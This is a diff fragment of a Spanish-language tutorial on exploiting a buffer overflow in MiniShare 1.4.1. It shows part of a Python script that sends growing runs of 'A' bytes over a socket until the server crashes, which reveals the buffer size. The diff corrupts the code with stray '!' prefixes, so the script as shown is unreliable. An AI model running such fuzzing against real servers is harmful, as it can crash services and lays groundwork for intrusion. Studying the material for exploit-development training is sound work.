@@ -28,17 +28,17 @@ Para ver que comando vamos a usar, utilizaremos burpsuite y un proxy
 ![image](https://user-images.githubusercontent.com/104048850/180593888-219158db-ad4b-454e-a6e5-2aa429d6c417.png)
 ***
 Ahora  ejecutamos el siguinte script  para ver la capacidad del buffer 
-> #!/usr/bin/python3.8
-> # This is a Proof of concept about BufferOverflow vulnerability in MiniShare 1.4.1
+#!/usr/bin/python3.8
+#! This is a Proof of concept about BufferOverflow vulnerability in MiniShare 1.4.1
 
-> # Part 1 of proof of concept by Vry4n
-> # This script is intended to discover the size of the buffer
+ !# Part 1 of proof of concept by Vry4n
+!# This script is intended to discover the size of the buffer
 import socket
 
-FUZZ = ""
+!FUZZ = ""
 
-# While true increase the variable FUZZ by adding 100 "A" until the program crashes
-while True:
+!# While true increase the variable FUZZ by adding 100 "A" until the program crashes
+!while True:
     FUZZ += "A" * 100
     print("Fuzzing with {} bytes".format(len(FUZZ)))
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
